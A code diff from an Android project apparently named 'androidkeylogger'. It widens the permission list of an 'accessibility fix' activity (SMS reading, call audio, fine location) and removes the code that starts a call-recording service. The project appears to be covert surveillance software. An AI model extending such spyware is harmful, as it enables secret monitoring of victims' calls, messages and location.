@@ -2,6 +2,7 @@ package com.azamovhudstc.androidkeylogger.activity
 
 import com.azamovhudstc.androidkeylogger.service.CallRecordingService
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -20,14 +21,15 @@ import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 
 class AccessibilityFixActivity : AppCompatActivity() {
     private val REQUEST_CODE_NOTIFICATION_LISTENER = 10
-    private val RECORD_AUDIO_PERMISSION_REQUEST_CODE = 124
     private val PERMISSION_REQUEST_CODE = 123
-    private val READ_PHONE_NUMBERS_PERMISSION_REQUEST_CODE = 120
+    @SuppressLint("InlinedApi")
     private val permissions = arrayOf(
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.READ_PHONE_NUMBERS,
         Manifest.permission.MODIFY_AUDIO_SETTINGS,
         Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.POST_NOTIFICATIONS,
+        Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.BROADCAST_SMS,
         Manifest.permission.READ_SMS,
         Manifest.permission.RECEIVE_SMS,
@@ -139,28 +141,13 @@ class AccessibilityFixActivity : AppCompatActivity() {
             PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                     // All permissions granted, proceed with audio recording
-                    startYourService()
                 } else {
                     // Permission denied, inform the user and ask to enable from settings
-                    showPermissionDialog()
                 }
             }
         }
     }
 
-    private fun showPermissionDialog() {
-        val builder = AlertDialog.Builder(this)
-        builder.setTitle("Permissions Required")
-            .setMessage("Please enable the required permissions from the app settings.")
-            .setPositiveButton("Go to Settings") { _, _ ->
-                openAppSettings()
-            }
-            .setNegativeButton("Cancel") { dialog, _ ->
-                dialog.dismiss()
-            }
-            .setCancelable(false)
-            .show()
-    }
 
     private fun openAppSettings() {
         val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
@@ -170,11 +157,7 @@ class AccessibilityFixActivity : AppCompatActivity() {
     }
 
     private fun startYourService() {
-        val serviceIntent = Intent(
-            this,
-            CallRecordingService::class.java
-        )
-        startService(serviceIntent)
+        //Nothing
     }   /* Access modifiers changed, original: protected */
 
     public override fun onDestroy() {
